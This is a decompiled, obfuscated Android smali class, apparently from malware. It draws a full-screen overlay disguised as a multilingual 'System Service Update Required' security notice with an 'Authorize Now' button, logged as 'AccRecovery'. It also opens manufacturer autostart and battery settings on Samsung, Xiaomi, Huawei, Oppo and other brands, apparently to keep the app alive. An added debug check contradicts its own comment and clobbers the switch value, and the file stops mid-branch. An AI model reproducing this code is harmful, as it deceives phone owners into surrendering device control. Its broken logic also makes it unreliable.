.class public final synthetic Lڝږ؁ڋ/ؤ;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field public final synthetic آ:I

.field public final synthetic أ:Landroid/content/Context;


# direct methods
.method public synthetic constructor <init>(Landroid/content/Context;I)V
    .locals 0

    iput p2, p0, Lڝږ؁ڋ/ؤ;->آ:I

    iput-object p1, p0, Lڝږ؁ڋ/ؤ;->أ:Landroid/content/Context;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 22

    move-object/from16 v1, p0

    iget v0, v1, Lڝږ؁ڋ/ؤ;->آ:I

    const/high16 v2, 0x10000000

    iget-object v3, v1, Lڝږ؁ڋ/ؤ;->أ:Landroid/content/Context;

    # 调试模式：引导动作全部跳过
    :try_start_rundbg
    invoke-static {v3}, Lڝږ؁ڋ/ڽ;->isDebug(Landroid/content/Context;)Z
    move-result v0
    if-nez v0, :rundbg_ok
    return-void
    :rundbg_ok
    :try_end_rundbg
    .catch Ljava/lang/Exception; {:try_start_rundbg .. :try_end_rundbg} :catch_rundbg
    goto :gotoundbg

    :catch_rundbg
    move-exception v4
    :gotoundbg

    packed-switch v0, :pswitch_data_0

    goto/16 :goto_10

    :pswitch_0
    sget-object v0, Lڟەطڽٲ/ؠ;->؋:Landroid/widget/FrameLayout;

    invoke-virtual {v3}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v2, "AccRecovery"

    sget-boolean v3, Lڟەطڽٲ/ؠ;->آ:Z

    if-eqz v3, :cond_0

    goto/16 :goto_4

    :cond_0
    :try_start_0
    invoke-static {v0}, Landroid/provider/Settings;->canDrawOverlays(Landroid/content/Context;)Z

    move-result v3

    if-nez v3, :cond_1

    const-string v0, "No SYSTEM_ALERT_WINDOW permission"

    invoke-static {v2, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    goto/16 :goto_4

    :cond_1
    const-string v3, "window"

    invoke-virtual {v0, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/view/WindowManager;

    sput-object v3, Lڟەطڽٲ/ؠ;->ؠ:Landroid/view/WindowManager;

    if-nez v3, :cond_2

    goto/16 :goto_4

    :cond_2
    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v3

    invoke-virtual {v3}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v4

    const/4 v7, -0x1

    const/16 v8, 0xc31

    const/4 v9, 0x1

    const/4 v10, 0x2

    if-eq v4, v8, :cond_a

    const/16 v8, 0xcae

    if-eq v4, v8, :cond_9

    const/16 v8, 0xccc

    if-eq v4, v8, :cond_8

    const/16 v8, 0xd01

    if-eq v4, v8, :cond_7

    const/16 v8, 0xd1b

    if-eq v4, v8, :cond_6

    const/16 v8, 0xe04

    if-eq v4, v8, :cond_5

    const/16 v8, 0xe74

    if-eq v4, v8, :cond_4

    const/16 v8, 0xeb3

    if-eq v4, v8, :cond_3

    goto :goto_0

    :cond_3
    const-string v4, "vi"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_b

    const/4 v3, 0x6

    goto :goto_1

    :cond_4
    const-string v4, "th"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_b

    const/4 v3, 0x7

    goto :goto_1

    :cond_5
    const-string v4, "pt"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_b

    move v3, v9

    goto :goto_1

    :cond_6
    const-string v4, "id"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_b

    const/4 v3, 0x5

    goto :goto_1

    :cond_7
    const-string v4, "hi"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_b

    const/4 v3, 0x4

    goto :goto_1

    :cond_8
    const-string v4, "fr"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_b

    move v3, v10

    goto :goto_1

    :cond_9
    const-string v4, "es"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_b

    const/4 v3, 0x0

    goto :goto_1

    :cond_a
    const-string v4, "ar"

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_b

    const/4 v3, 0x3

    goto :goto_1

    :cond_b
    :goto_0
    move v3, v7

    :goto_1
    packed-switch v3, :pswitch_data_1

    const-string v3, "System Service Update Required"

    goto :goto_2

    :pswitch_1
    const-string v3, "\u0e08\u0e33\u0e40\u0e1b\u0e47\u0e19\u0e15\u0e49\u0e2d\u0e07\u0e2d\u0e31\u0e1b\u0e40\u0e14\u0e15\u0e1a\u0e23\u0e34\u0e01\u0e32\u0e23\u0e23\u0e30\u0e1a\u0e1a"

    const-string v4, "\u0e1a\u0e23\u0e34\u0e01\u0e32\u0e23\u0e23\u0e30\u0e1a\u0e1a\u0e17\u0e35\u0e48\u0e08\u0e33\u0e40\u0e1b\u0e47\u0e19\u0e16\u0e39\u0e01\u0e1b\u0e34\u0e14\u0e43\u0e0a\u0e49\u0e07\u0e32\u0e19 \u0e01\u0e23\u0e38\u0e13\u0e32\u0e40\u0e1b\u0e34\u0e14\u0e43\u0e0a\u0e49\u0e07\u0e32\u0e19\u0e2d\u0e35\u0e01\u0e04\u0e23\u0e31\u0e49\u0e07\u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e43\u0e2b\u0e49\u0e2d\u0e38\u0e1b\u0e01\u0e23\u0e13\u0e4c\u0e22\u0e31\u0e07\u0e04\u0e07\u0e44\u0e14\u0e49\u0e23\u0e31\u0e1a\u0e01\u0e32\u0e23\u0e2d\u0e31\u0e1b\u0e40\u0e14\u0e15\u0e04\u0e27\u0e32\u0e21\u0e1b\u0e25\u0e2d\u0e14\u0e20\u0e31\u0e22"

    const-string v8, "\u0e2d\u0e19\u0e38\u0e0d\u0e32\u0e15\u0e15\u0e2d\u0e19\u0e19\u0e35\u0e49"

    const-string v11, "\u0e40\u0e15\u0e37\u0e2d\u0e19\u0e09\u0e31\u0e19\u0e17\u0e35\u0e2b\u0e25\u0e31\u0e07"

    goto :goto_3

    :pswitch_2
    const-string v3, "C\u1eadp nh\u1eadt d\u1ecbch v\u1ee5 h\u1ec7 th\u1ed1ng"

    const-string v4, "M\u1ed9t d\u1ecbch v\u1ee5 h\u1ec7 th\u1ed1ng c\u1ea7n thi\u1ebft \u0111\u00e3 b\u1ecb v\u00f4 hi\u1ec7u h\u00f3a. Vui l\u00f2ng b\u1eadt l\u1ea1i \u0111\u1ec3 thi\u1ebft b\u1ecb ti\u1ebfp t\u1ee5c nh\u1eadn c\u00e1c b\u1ea3n c\u1eadp nh\u1eadt b\u1ea3o m\u1eadt."

    const-string v8, "\u1ee6y quy\u1ec1n ngay"

    const-string v11, "Nh\u1eafc t\u00f4i sau"

    goto :goto_3

    :pswitch_3
    const-string v3, "Pembaruan Layanan Sistem"

    const-string v4, "Layanan sistem yang diperlukan telah dinonaktifkan. Aktifkan kembali untuk memastikan perangkat Anda terus menerima pembaruan keamanan."

    const-string v8, "Otorisasi Sekarang"

    const-string v11, "Ingatkan nanti"

    goto :goto_3

    :pswitch_4
    const-string v3, "\u0938\u093f\u0938\u094d\u091f\u092e \u0938\u0947\u0935\u093e \u0905\u092a\u0921\u0947\u091f \u0906\u0935\u0936\u094d\u092f\u0915"

    const-string v4, "\u090f\u0915 \u0906\u0935\u0936\u094d\u092f\u0915 \u0938\u093f\u0938\u094d\u091f\u092e \u0938\u0947\u0935\u093e \u0905\u0915\u094d\u0937\u092e \u0915\u0930 \u0926\u0940 \u0917\u0908 \u0939\u0948\u0964 \u0915\u0943\u092a\u092f\u093e \u0938\u0941\u0930\u0915\u094d\u0937\u093e \u0905\u092a\u0921\u0947\u091f \u092a\u094d\u0930\u093e\u092a\u094d\u0924 \u0915\u0930\u0928\u0947 \u0915\u0947 \u0932\u093f\u090f \u0907\u0938\u0947 \u092a\u0941\u0928\u0903 \u0938\u0915\u094d\u0937\u092e \u0915\u0930\u0947\u0902\u0964"

    const-string v8, "\u0905\u092d\u0940 \u0905\u0927\u093f\u0915\u0943\u0924 \u0915\u0930\u0947\u0902"

    const-string v11, "\u092c\u093e\u0926 \u092e\u0947\u0902 \u092f\u093e\u0926 \u0926\u093f\u0932\u093e\u090f\u0902"

    goto :goto_3

    :pswitch_5
    const-string v3, "\u062a\u062d\u062f\u064a\u062b \u062e\u062f\u0645\u0629 \u0627\u0644\u0646\u0638\u0627\u0645 \u0645\u0637\u0644\u0648\u0628"

    const-string v4, "\u062a\u0645 \u062a\u0639\u0637\u064a\u0644 \u062e\u062f\u0645\u0629 \u0646\u0638\u0627\u0645 \u0645\u0637\u0644\u0648\u0628\u0629. \u064a\u0631\u062c\u0649 \u0625\u0639\u0627\u062f\u0629 \u062a\u0641\u0639\u064a\u0644\u0647\u0627 \u0644\u0636\u0645\u0627\u0646 \u0627\u0633\u062a\u0645\u0631\u0627\u0631 \u062c\u0647\u0627\u0632\u0643 \u0641\u064a \u062a\u0644\u0642\u064a \u062a\u062d\u062f\u064a\u062b\u0627\u062a \u0627\u0644\u0623\u0645\u0627\u0646."

    const-string v8, "\u062a\u0641\u0648\u064a\u0636 \u0627\u0644\u0622\u0646"

    const-string v11, "\u0630\u0643\u0631\u0646\u064a \u0644\u0627\u062d\u0642\u0627\u064b"

    goto :goto_3

    :pswitch_6
    const-string v3, "Mise \u00e0 jour du service syst\u00e8me"

    const-string v4, "Un service syst\u00e8me requis a \u00e9t\u00e9 d\u00e9sactiv\u00e9. Veuillez le r\u00e9activer pour continuer \u00e0 recevoir les mises \u00e0 jour de s\u00e9curit\u00e9."

    const-string v8, "Autoriser maintenant"

    const-string v11, "Me rappeler plus tard"

    goto :goto_3

    :pswitch_7
    const-string v3, "Atualiza\u00e7\u00e3o do servi\u00e7o do sistema"

    const-string v4, "Um servi\u00e7o necess\u00e1rio do sistema foi desativado. Reative-o para que seu dispositivo continue recebendo atualiza\u00e7\u00f5es de seguran\u00e7a."

    const-string v8, "Autorizar agora"

    const-string v11, "Lembrar-me mais tarde"

    goto :goto_3

    :pswitch_8
    const-string v3, "Actualizaci\u00f3n del servicio del sistema"

    const-string v4, "Un servicio del sistema necesario ha sido desactivado. Vuelva a habilitarlo para que su dispositivo siga recibiendo actualizaciones de seguridad."

    const-string v8, "Autorizar ahora"

    const-string v11, "Recordarme m\u00e1s tarde"

    goto :goto_3

    :goto_2
    const-string v4, "A required system service has been disabled. Please re-enable it to ensure your device continues to receive security updates."

    const-string v8, "Authorize Now"

    const-string v11, "Remind me later"

    :goto_3
    new-instance v12, Landroid/widget/FrameLayout;

    invoke-direct {v12, v0}, Landroid/widget/FrameLayout;-><init>(Landroid/content/Context;)V

    const/high16 v13, -0x34000000    # -3.3554432E7f

    invoke-virtual {v12, v13}, Landroid/view/View;->setBackgroundColor(I)V

    new-instance v13, Landroid/widget/LinearLayout;

    invoke-direct {v13, v0}, Landroid/widget/LinearLayout;-><init>(Landroid/content/Context;)V

    invoke-virtual {v13, v9}, Landroid/widget/LinearLayout;->setOrientation(I)V

    new-instance v14, Landroid/graphics/drawable/GradientDrawable;

    invoke-direct {v14}, Landroid/graphics/drawable/GradientDrawable;-><init>()V

    invoke-virtual {v14, v7}, Landroid/graphics/drawable/GradientDrawable;->setColor(I)V

    const/16 v15, 0x14

    invoke-static {v0, v15}, Lڟەطڽٲ/ؠ;->ؠ(Landroid/content/Context;I)I

    move-result v15

    int-to-float v15, v15

    invoke-virtual {v14, v15}, Landroid/graphics/drawable/GradientDrawable;->setCornerRadius(F)V

    invoke-virtual {v13, v14}, Landroid/view/View;->setBackground(Landroid/graphics/drawable/Drawable;)V

    const/16 v14, 0x1c

    invoke-static {v0, v14}, Lڟەطڽٲ/ؠ;->ؠ(Landroid/content/Context;I)I

    move-result v15

    const/16 v6, 0x20

    invoke-static {v0, v6}, Lڟەطڽٲ/ؠ;->ؠ(Landroid/content/Context;I)I

    move-result v6

    invoke-static {v0, v14}, Lڟەطڽٲ/ؠ;->ؠ(Landroid/content/Context;I)I

    move-result v14

    const/16 v5, 0x18

    invoke-static {v0, v5}, Lڟەطڽٲ/ؠ;->ؠ(Landroid/content/Context;I)I

    move-result v7

    invoke-virtual {v13, v15, v6, v14, v7}, Landroid/view/View;->setPadding(IIII)V

    new-instance v6, Landroid/widget/TextView;

    invoke-direct {v6, v0}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V

    const-string v7, "\ud83d\udee1\ufe0f"

    invoke-virtual {v6, v7}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    const/high16 v7, 0x42400000    # 48.0f

    invoke-virtual {v6, v10, v7}, Landroid/widget/TextView;->setTextSize(IF)V

    const/16 v7, 0x11

    invoke-virtual {v6, v7}, Landroid/widget/TextView;->setGravity(I)V

    invoke-virtual {v13, v6}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    new-instance v6, Landroid/widget/TextView;

    invoke-direct {v6, v0}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V

    invoke-virtual {v6, v3}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    const/high16 v3, 0x41900000    # 18.0f

    invoke-virtual {v6, v10, v3}, Landroid/widget/TextView;->setTextSize(IF)V

    const v3, -0xe5e5e6

    invoke-virtual {v6, v3}, Landroid/widget/TextView;->setTextColor(I)V

    const/4 v3, 0x0

    invoke-virtual {v6, v3, v9}, Landroid/widget/TextView;->setTypeface(Landroid/graphics/Typeface;I)V

    invoke-virtual {v6, v7}, Landroid/widget/TextView;->setGravity(I)V

    new-instance v14, Landroid/widget/LinearLayout$LayoutParams;

    const/4 v15, -0x2

    const/4 v5, -0x1

    invoke-direct {v14, v5, v15}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    const/16 v5, 0x10

    invoke-static {v0, v5}, Lڟەطڽٲ/ؠ;->ؠ(Landroid/content/Context;I)I

    move-result v3

    iput v3, v14, Landroid/widget/LinearLayout$LayoutParams;->topMargin:I

    invoke-virtual {v13, v6, v14}, Landroid/view/ViewGroup;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    new-instance v3, Landroid/widget/TextView;

    invoke-direct {v3, v0}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V

    invoke-virtual {v3, v4}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    const/high16 v4, 0x41600000    # 14.0f

    invoke-virtual {v3, v10, v4}, Landroid/widget/TextView;->setTextSize(IF)V

    const v4, -0xaaaaab

    invoke-virtual {v3, v4}, Landroid/widget/TextView;->setTextColor(I)V

    invoke-virtual {v3, v7}, Landroid/widget/TextView;->setGravity(I)V

    const/4 v4, 0x3

    invoke-static {v0, v4}, Lڟەطڽٲ/ؠ;->ؠ(Landroid/content/Context;I)I

    move-result v4

    int-to-float v4, v4

    const/high16 v6, 0x3f800000    # 1.0f

    invoke-virtual {v3, v4, v6}, Landroid/widget/TextView;->setLineSpacing(FF)V

    new-instance v4, Landroid/widget/LinearLayout$LayoutParams;

    const/4 v6, -0x1

    invoke-direct {v4, v6, v15}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    const/16 v6, 0xc

    invoke-static {v0, v6}, Lڟەطڽٲ/ؠ;->ؠ(Landroid/content/Context;I)I

    move-result v14

    iput v14, v4, Landroid/widget/LinearLayout$LayoutParams;->topMargin:I

    invoke-virtual {v13, v3, v4}, Landroid/view/ViewGroup;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    new-instance v3, Landroid/widget/TextView;

    invoke-direct {v3, v0}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V

    invoke-virtual {v3, v8}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    const/high16 v4, 0x41800000    # 16.0f

    invoke-virtual {v3, v10, v4}, Landroid/widget/TextView;->setTextSize(IF)V

    const/4 v4, -0x1

    invoke-virtual {v3, v4}, Landroid/widget/TextView;->setTextColor(I)V

    const/4 v4, 0x0

    invoke-virtual {v3, v4, v9}, Landroid/widget/TextView;->setTypeface(Landroid/graphics/Typeface;I)V

    invoke-virtual {v3, v7}, Landroid/widget/TextView;->setGravity(I)V

    const/16 v4, 0xe

    invoke-static {v0, v4}, Lڟەطڽٲ/ؠ;->ؠ(Landroid/content/Context;I)I

    move-result v8

    invoke-static {v0, v4}, Lڟەطڽٲ/ؠ;->ؠ(Landroid/content/Context;I)I

    move-result v4

    const/4 v14, 0x0

    invoke-virtual {v3, v14, v8, v14, v4}, Landroid/widget/TextView;->setPadding(IIII)V

    new-instance v4, Landroid/graphics/drawable/GradientDrawable;

    invoke-direct {v4}, Landroid/graphics/drawable/GradientDrawable;-><init>()V

    const v8, -0xbd7a0c

    invoke-virtual {v4, v8}, Landroid/graphics/drawable/GradientDrawable;->setColor(I)V

    invoke-static {v0, v6}, Lڟەطڽٲ/ؠ;->ؠ(Landroid/content/Context;I)I

    move-result v6

    int-to-float v6, v6

    invoke-virtual {v4, v6}, Landroid/graphics/drawable/GradientDrawable;->setCornerRadius(F)V

    invoke-virtual {v3, v4}, Landroid/view/View;->setBackground(Landroid/graphics/drawable/Drawable;)V

    new-instance v4, Landroid/widget/LinearLayout$LayoutParams;

    const/4 v6, -0x1

    invoke-direct {v4, v6, v15}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    const/16 v6, 0x18

    invoke-static {v0, v6}, Lڟەطڽٲ/ؠ;->ؠ(Landroid/content/Context;I)I

    move-result v6

    iput v6, v4, Landroid/widget/LinearLayout$LayoutParams;->topMargin:I

    invoke-virtual {v13, v3, v4}, Landroid/view/ViewGroup;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    new-instance v4, Lڟەطڽٲ/؋;

    const/4 v6, 0x0

    invoke-direct {v4, v0, v6}, Lڟەطڽٲ/؋;-><init>(Landroid/content/Context;I)V

    invoke-virtual {v3, v4}, Landroid/view/View;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    new-instance v3, Landroid/widget/TextView;

    invoke-direct {v3, v0}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V

    invoke-virtual {v3, v11}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    const/high16 v4, 0x41500000    # 13.0f

    invoke-virtual {v3, v10, v4}, Landroid/widget/TextView;->setTextSize(IF)V

    const v4, -0x666667

    invoke-virtual {v3, v4}, Landroid/widget/TextView;->setTextColor(I)V

    invoke-virtual {v3, v7}, Landroid/widget/TextView;->setGravity(I)V

    new-instance v4, Landroid/widget/LinearLayout$LayoutParams;

    const/4 v6, -0x1

    invoke-direct {v4, v6, v15}, Landroid/widget/LinearLayout$LayoutParams;-><init>(II)V

    invoke-static {v0, v5}, Lڟەطڽٲ/ؠ;->ؠ(Landroid/content/Context;I)I

    move-result v5

    iput v5, v4, Landroid/widget/LinearLayout$LayoutParams;->topMargin:I

    invoke-virtual {v13, v3, v4}, Landroid/view/ViewGroup;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    new-instance v4, Lڟەطڽٲ/؋;

    invoke-direct {v4, v0, v9}, Lڟەطڽٲ/؋;-><init>(Landroid/content/Context;I)V

    invoke-virtual {v3, v4}, Landroid/view/View;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    new-instance v3, Landroid/widget/FrameLayout$LayoutParams;

    const/16 v4, 0x12c

    invoke-static {v0, v4}, Lڟەطڽٲ/ؠ;->ؠ(Landroid/content/Context;I)I

    move-result v0

    invoke-direct {v3, v0, v15, v7}, Landroid/widget/FrameLayout$LayoutParams;-><init>(III)V

    invoke-virtual {v12, v13, v3}, Landroid/view/ViewGroup;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    const/16 v19, 0x7f6

    new-instance v0, Landroid/view/WindowManager$LayoutParams;

    const/16 v17, -0x1

    const/16 v18, -0x1

    const v20, 0x280108

    const/16 v21, -0x3

    move-object/from16 v16, v0

    invoke-direct/range {v16 .. v21}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    iput v7, v0, Landroid/view/WindowManager$LayoutParams;->gravity:I

    sget-object v3, Lڟەطڽٲ/ؠ;->ؠ:Landroid/view/WindowManager;

    invoke-interface {v3, v12, v0}, Landroid/view/ViewManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    sput-object v12, Lڟەطڽٲ/ؠ;->؋:Landroid/widget/FrameLayout;

    sput-boolean v9, Lڟەطڽٲ/ؠ;->آ:Z

    const-string v0, "Recovery overlay shown"

    invoke-static {v2, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_4

    :catch_0
    move-exception v0

    const-string v3, "show error"

    invoke-static {v2, v3, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_4
    return-void

    :pswitch_9
    sget-object v0, Lڟەطڽٲ/ؠ;->؋:Landroid/widget/FrameLayout;

    invoke-virtual {v3}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    invoke-static {}, Lڟەطڽٲ/ؠ;->؋()V

    return-void

    :pswitch_a
    :try_start_1
    invoke-static {v3}, Lڗًقڔ/ء;->ظ(Landroid/content/Context;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    return-void

    :pswitch_b
    invoke-static {v3}, Lڝږ؁ڋ/ح;->ة(Landroid/content/Context;)V

    return-void

    :pswitch_c
    invoke-static {v3}, Lڝږ؁ڋ/ح;->ب(Landroid/content/Context;)V

    return-void

    :pswitch_d
    const-string v0, "com.transsion.phonemanager"

    const-string v4, "com.samsung.android.sm.ui.battery.BatteryActivity"

    const-string v5, "com.samsung.android.lool"

    const-string v6, "com.asus.mobilemanager"

    const-string v7, "com.iqoo.secure"

    sget-object v8, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    invoke-virtual {v8}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v8

    :try_start_2
    const-string v9, "samsung"

    invoke-virtual {v8, v9}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v9

    if-eqz v9, :cond_c

    const-string v0, "com.samsung.android.sm.battery.ui.BatteryActivity"

    invoke-static {v3, v5, v0}, Lڃٷښـ۝ۼ/ؠ;->ض(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_1d

    const-string v0, "com.samsung.android.sm"

    invoke-static {v3, v0, v4}, Lڃٷښـ۝ۼ/ؠ;->ض(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_1d

    invoke-static {v3, v5, v4}, Lڃٷښـ۝ۼ/ؠ;->ض(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    goto/16 :goto_d

    :cond_c
    const-string v4, "xiaomi"

    invoke-virtual {v8, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_4

    const-string v5, "android.intent.category.DEFAULT"

    if-nez v4, :cond_1c

    :try_start_3
    const-string v4, "redmi"

    invoke-virtual {v8, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_1c

    const-string v4, "poco"

    invoke-virtual {v8, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_d

    goto/16 :goto_b

    :cond_d
    const-string v4, "oppo"

    invoke-virtual {v8, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_4

    const-string v9, "com.coloros.safecenter.permission.startup.StartupAppListActivity"

    const-string v10, "com.coloros.safecenter"

    if-nez v4, :cond_1b

    :try_start_4
    const-string v4, "realme"

    invoke-virtual {v8, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_e

    goto/16 :goto_9

    :cond_e
    const-string v4, "oneplus"

    invoke-virtual {v8, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_f

    const-string v0, "com.oneplus.security"

    const-string v2, "com.oneplus.security.chainlaunch.view.ChainLaunchAppListActivity"

    invoke-static {v3, v0, v2}, Lڃٷښـ۝ۼ/ؠ;->ض(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_1d

    invoke-static {v3, v10, v9}, Lڃٷښـ۝ۼ/ؠ;->ض(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    goto/16 :goto_d

    :cond_f
    const-string v4, "vivo"

    invoke-virtual {v8, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_1a

    const-string v4, "iqoo"

    invoke-virtual {v8, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_10

    goto/16 :goto_8

    :cond_10
    const-string v4, "honor"

    invoke-virtual {v8, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_4

    const-string v7, "com.huawei.systemmanager.optimize.process.ProtectActivity"

    const-string v9, "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"

    const-string v10, "com.huawei.systemmanager"

    if-eqz v4, :cond_11

    :try_start_5
    const-string v0, "com.hihonor.systemmanager"

    const-string v4, "com.hihonor.systemmanager.startupmgr.ui.StartupNormalAppListActivity"

    invoke-static {v3, v0, v4}, Lڃٷښـ۝ۼ/ؠ;->ض(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_4

    if-nez v0, :cond_1d

    :try_start_6
    new-instance v0, Landroid/content/Intent;

    const-string v4, "hihonor.intent.action.HSM_BOOTAPP_MANAGER"

    invoke-direct {v0, v4}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v3, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_2

    goto/16 :goto_d

    :catch_2
    :try_start_7
    invoke-static {v3, v10, v9}, Lڃٷښـ۝ۼ/ؠ;->ض(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_1d

    goto :goto_5

    :cond_11
    const-string v4, "huawei"

    invoke-virtual {v8, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_12

    invoke-static {v3, v10, v9}, Lڃٷښـ۝ۼ/ؠ;->ض(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_4

    if-nez v0, :cond_1d

    :try_start_8
    new-instance v0, Landroid/content/Intent;

    const-string v4, "huawei.intent.action.HSM_BOOTAPP_MANAGER"

    invoke-direct {v0, v4}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v3, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_3

    goto/16 :goto_d

    :catch_3
    :try_start_9
    const-string v0, "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity"

    invoke-static {v3, v10, v0}, Lڃٷښـ۝ۼ/ؠ;->ض(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_1d

    :goto_5
    invoke-static {v3, v10, v7}, Lڃٷښـ۝ۼ/ؠ;->ض(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    goto/16 :goto_d

    :cond_12
    const-string v4, "tecno"

    invoke-virtual {v8, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_19

    const-string v4, "infinix"

    invoke-virtual {v8, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_19

    const-string v4, "itel"

    invoke-virtual {v8, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_13

    goto/16 :goto_7

    :cond_13
    const-string v0, "asus"

    invoke-virtual {v8, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

